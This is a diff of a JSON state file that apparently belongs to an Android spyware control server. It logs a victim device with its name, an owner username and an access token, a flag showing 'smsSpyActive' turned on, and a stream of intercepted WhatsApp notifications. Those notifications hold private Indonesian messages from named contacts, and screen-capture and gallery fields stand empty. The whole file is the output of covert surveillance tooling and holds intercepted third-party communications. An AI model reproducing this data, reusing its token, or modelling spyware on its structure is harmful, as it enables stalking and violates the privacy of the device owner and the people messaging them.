@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776959527240,
+    "lastSeen": 1776959534724,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959535708
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959528544
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959528516
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "23/04 21:43",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951821914
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎64 pesan dari 42 chat",
-        "time": "23/04 21:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951819268
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "nnti klo kenbangun aku nyalain",
-        "time": "23/04 21:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951818964
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎63 pesan dari 42 chat",
-        "time": "23/04 21:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951810454
       }
     ],
     "galleryPhotos": [],
